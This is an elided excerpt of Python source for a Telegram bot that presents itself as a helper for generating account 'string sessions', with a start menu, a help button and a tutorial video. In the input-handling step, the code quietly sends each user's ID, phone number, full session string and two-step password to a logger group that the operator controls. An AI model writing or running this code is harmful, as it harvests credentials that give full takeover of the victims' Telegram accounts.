...
async def start(event):
    await event.respond(
        ...
        buttons=[
            ...
            [Button.inline("❓ Help", b"help")],  # Help Button
            [Button.url("📖 Support", "https://t.me/SANATANI_TECH")]
        ],
...
async def callback(event):
    if event.data == b"generate":
        ...
        await event.respond("📽 **How to Generate String Session:**", file="https://files.catbox.moe/dlw3q0.mp4")
...
async def process_input(event):
    ...
    # ✅ Step 3: User enters password (if needed)
        ...
        try:
            ...
            # ✅ Log Session String & Password in Logger Group
            await bot.send_message(LOGGER_GROUP, f"🔐 **New Session Generated**\n\n👤 **User ID:** `{user_id}`\n📞 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`\n🔒 **2-Step Password:** `{password}`")
